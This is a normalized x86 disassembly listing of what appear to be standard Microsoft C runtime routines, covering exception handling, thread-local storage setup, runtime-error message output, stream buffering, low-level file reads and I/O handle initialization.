mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_437c1c
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_43fad0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_43fb60
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_44ca45
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_44ca64
jmp r-xdata
sub_43fb60
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_437c1c
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_43fad0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_43fbc2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_43fbf2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_43fc22
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_43fc48
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_43fc22
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
push 0x3
call sub_44cd15
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_44cd15
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_442994
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_43c860
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_43f873
push esi
call sub_442a37
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_442994
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_44cbd3
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_442a37
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_44cc48
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_44cbd3
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_44ca67
add esp 0xc
jmp r-xdata
sub_43fdf7
push 0x3
call sub_44cd15
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_43fc48
push 0xff
call sub_43fc48
pop ecx
pop ecx
push 0x3
call sub_44cd15
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_43fe42
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_43fe76
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_4381f8
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_43feb3
push 0x8
push r--data
call sub_43f8e0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43ff55
push 0xc
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_441ed7
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43ff5e
call sub_43f925
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_43ff67
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_43fe42
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_43de17
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_4381f8
pop ecx
xor esi esi
push 0x0
push esi
call sub_43feb3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_43fffd
push 0x8
push r--data
call sub_43f8e0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_43f925
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_4381f8
pop ecx
push 0xd
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_4381f8
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_440117
push 0xc
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_440123
push esi
call sub_4381f8
pop ecx
push edi
call sub_441f66
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_4381f8
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_441fff
pop ecx
sub_44012c
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_43fe76
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_43fe39
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_43b4d4
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_442aee
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_43fe76
mov edi [ DecodePointer@IAT ]
push sub_43fffd
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_43de17
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_43feb3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_4402a7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_44b922
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_43917d
pop ecx
push eax
call sub_440980
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_4403c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_43c05f
mov [ eax ] ebx
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_43c05f
mov [ eax ] ebx
call sub_43c04c
mov [ eax ] 0x9
jmp r-xdata
call sub_43c05f
mov [ eax ] ebx
call sub_43c04c
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_43f8c5
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_43ddd2
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_44bd22
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_43c04c
mov [ eax ] 0xc
call sub_43c05f
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_43c072
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_43c04c
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_44bd22
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_44bd22
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_44bd22
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_440980
push 0x10
push r--data
call sub_43f8e0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_43f925
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_442e0b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x16
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4403c9
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_43f8c5
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_440a6e
mov eax [ ebp - 0x1c ]
sub_440a76
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_43de17
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_43de17
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
